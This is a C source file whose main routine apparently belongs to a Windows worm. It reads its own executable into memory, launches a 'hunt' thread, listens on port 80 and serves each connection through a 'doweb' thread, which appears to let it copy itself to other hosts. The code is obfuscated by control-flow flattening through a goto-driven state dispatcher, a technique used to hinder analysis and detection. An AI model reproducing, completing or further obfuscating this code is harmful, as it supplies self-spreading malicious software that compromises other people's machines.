#pragma optimize("", off)

#include "data_globals.h"
#include <windows.h>
#include <winsock2.h>

int main(int argc, char **argv, char **env) {
    WSADATA wsaData;
    SOCKET listen_sock, client_sock;
    SOCKADDR_IN server_addr, client_addr;
    int addr_len = sizeof(client_addr);
    HANDLE hFile;
    DWORD bytesread;
    DWORD threadId;

    volatile int ctrl_state = 1;
    volatile int retval = 0;

ctrl_dispatcher:
    if (ctrl_state == 0) goto ctrl_end;
    if (ctrl_state == 1) goto ctrl_block1;
    if (ctrl_state == 2) goto ctrl_block2;
    if (ctrl_state == 3) goto ctrl_block3;
    if (ctrl_state == 4) goto ctrl_block4;
    if (ctrl_state == 5) goto ctrl_block5;
    if (ctrl_state == 6) goto ctrl_block6;
    if (ctrl_state == 7) goto ctrl_block7;
    if (ctrl_state == 8) goto ctrl_block8;
    if (ctrl_state == 9) goto ctrl_block9;
    if (ctrl_state == 10) goto ctrl_block10;
    if (ctrl_state == 11) goto ctrl_block11;
    if (ctrl_state == 12) goto ctrl_block12;

ctrl_block1:
    // argc check
    if (argc < 1) {
        retval = 1;
        ctrl_state = 0;
        goto ctrl_dispatcher;
    }
    ctrl_state = 2;
    goto ctrl_dispatcher;

ctrl_block2:
    // CreateFileA
    hFile = CreateFileA(argv[0], GENERIC_READ, FILE_SHARE_READ, NULL,
                        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        retval = 1;
        ctrl_state = 0;
        goto ctrl_dispatcher;
    }
    ctrl_state = 3;
    goto ctrl_dispatcher;

ctrl_block3:
    // GetFileSize
    _sizemybytes = GetFileSize(hFile, NULL);
    if (_sizemybytes == INVALID_FILE_SIZE) {
        CloseHandle(hFile);
        retval = 1;
        ctrl_state = 0;
        goto ctrl_dispatcher;
    }
    ctrl_state = 4;
    goto ctrl_dispatcher;

ctrl_block4:
    // malloc
    _mybytes = (char *)malloc(_sizemybytes);
    if (!_mybytes) {
        CloseHandle(hFile);
        retval = 1;
        ctrl_state = 0;
        goto ctrl_dispatcher;
    }
    ctrl_state = 5;
    goto ctrl_dispatcher;

ctrl_block5:
    // ReadFile
    if (!ReadFile(hFile, _mybytes, _sizemybytes, &bytesread, NULL) || bytesread != _sizemybytes) {
        free(_mybytes);
        CloseHandle(hFile);
        retval = 1;
        ctrl_state = 0;
        goto ctrl_dispatcher;
    }
    ctrl_state = 6;
    goto ctrl_dispatcher;

ctrl_block6:
    // CloseHandle and WSAStartup
    CloseHandle(hFile);
    if (WSAStartup(MAKEWORD(1, 1), &wsaData) != 0) {
        free(_mybytes);
        retval = 1;
        ctrl_state = 0;
        goto ctrl_dispatcher;
    }
    ctrl_state = 7;
    goto ctrl_dispatcher;

ctrl_block7:
    setuphostname();
    CreateThread(NULL, 0, hunt, NULL, 0, &threadId);
    ctrl_state = 8;
    goto ctrl_dispatcher;

ctrl_block8:
    listen_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (listen_sock == INVALID_SOCKET) {
        WSACleanup();
        free(_mybytes);
        retval = 1;
        ctrl_state = 0;
        goto ctrl_dispatcher;
    }
    ctrl_state = 9;
    goto ctrl_dispatcher;

ctrl_block9:
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(80);
    if (bind(listen_sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) != 0) {
        closesocket(listen_sock);
        WSACleanup();
        free(_mybytes);
        retval = 1;
        ctrl_state = 0;
        goto ctrl_dispatcher;
    }
    ctrl_state = 10;
    goto ctrl_dispatcher;

ctrl_block10:
    if (listen(listen_sock, 5) != 0) {
        closesocket(listen_sock);
        WSACleanup();
        free(_mybytes);
        retval = 1;
        ctrl_state = 0;
        goto ctrl_dispatcher;
    }
    ctrl_state = 11;
    goto ctrl_dispatcher;

ctrl_block11:
    // while loop
    client_sock = accept(listen_sock, (struct sockaddr *)&client_addr, &addr_len);
    if (client_sock == INVALID_SOCKET) {
        // continue loop
        ctrl_state = 11;
        goto ctrl_dispatcher;
    }
    CreateThread(NULL, 0, doweb, &client_sock, 0, &threadId);
    // loop again
    ctrl_state = 11;
    goto ctrl_dispatcher;

ctrl_block12:
    // Never reached (cleanup)
    closesocket(listen_sock);
    WSACleanup();
    free(_mybytes);
    retval = 0;
    ctrl_state = 0;
    goto ctrl_dispatcher;

ctrl_end:
    return retval;
}

#pragma optimize("", on)
